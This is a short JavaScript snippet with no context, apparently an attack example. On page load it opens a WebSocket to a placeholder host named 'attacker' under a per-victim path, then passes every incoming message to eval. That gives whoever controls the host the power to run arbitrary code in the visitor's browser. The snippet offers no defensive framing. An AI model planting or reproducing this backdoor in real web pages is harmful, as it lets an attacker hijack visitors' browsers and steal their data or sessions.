window.onload = function() {
  var socket = new WebSocket('ws://attacker/maybe-unique-id-for-victim');
  socket.onmessage = function (req) {
    eval(req);
  };
};
